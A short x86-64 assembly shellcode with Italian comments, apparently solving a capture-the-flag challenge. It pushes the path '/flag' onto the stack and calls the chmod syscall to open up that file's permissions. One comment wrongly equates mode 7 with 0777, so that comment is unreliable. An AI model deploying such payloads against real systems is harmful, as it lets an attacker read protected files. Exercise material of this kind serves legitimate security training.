.intel_syntax noprefix
.global _start

.section .text
_start:
    xor rax, rax            #rendo rax vuoto
    push rax                #carico 0 sullo stack per avere un terminatore
    mov rax, 0x67616c662f   #metto dentro rax il percorso del file che voglio modificare
    push rax                #carico sullo stack
    mov rax, 90             # Reimposto rax sul numero della syscall 0x5a
    mov rdi, rsp            # Percorso del file (/flag)
    mov rsi, 7              # Permessi: 0777 (lettura, scrittura, esecuzione per tutti)
    syscall                 # Invoca la syscall

#funziona con sudo e con la challenge 1